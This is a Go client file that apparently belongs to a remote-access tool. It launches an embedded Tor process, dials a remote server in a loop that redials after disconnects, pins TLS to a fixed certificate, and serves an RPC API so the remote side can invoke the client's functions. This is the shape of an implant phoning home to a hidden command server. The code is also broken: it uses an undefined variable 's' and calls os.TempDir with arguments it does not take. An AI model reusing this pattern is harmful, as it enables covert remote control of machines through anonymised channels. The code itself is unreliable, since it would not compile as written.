// +build tor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"net/rpc"
	"os"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"
)

// connect dials a remote tor address and returns the resulting connection
func connect(dialer *tor.Dialer) (net.Conn, error) {
	log.Println("[NetClient] Connecting to:", s.addr)
	conn, err := dialer.Dial("tcp", s.addr)
	if err != nil {
		return nil, err
	}

	log.Println("[NetClient] [+] Connection to server successful")
	caPool := x509.NewCertPool()
	caPool.AddCert(s.cert)

	config := tls.Config{RootCAs: caPool, ServerName: s.domain}
	tlsconn := tls.Client(conn, &config)

	return tlsconn, nil
}

// NetClient starts a tor connection and invokes connect
// in a loop that redials on disconnect
func NetClient() {
	initServer()

	tmpDir, err := os.TempDir("", "")
	if err != nil {
		log.Println("[NetClient] [!] Could not create temp dir for Tor:", err)
		return
	}

	conf := tor.StartConf{
		ProcessCreator:    embedded.NewCreator(),
		DataDir:           tmpDir,
		RetainTempDataDir: false,
	}

	log.Println("[NetClient] Starting Tor connection...")
	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[NetClient] [!] Tor could not be started:", err)
		return
	}

	api := new(API)
	rpcErr := rpc.Register(api)
	if rpcErr != nil {
		log.Fatal("[NetClient] [!] Could not register RPC API:", rpcErr)
	}

	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)

	for {
		conn, err := connect(dialer)
		if err != nil {
			log.Println("[NetClient] [!] Could not connect:", err)
			time.Sleep(25 * time.Second)
			continue
		}
		rpc.ServeConn(conn)
	}
}
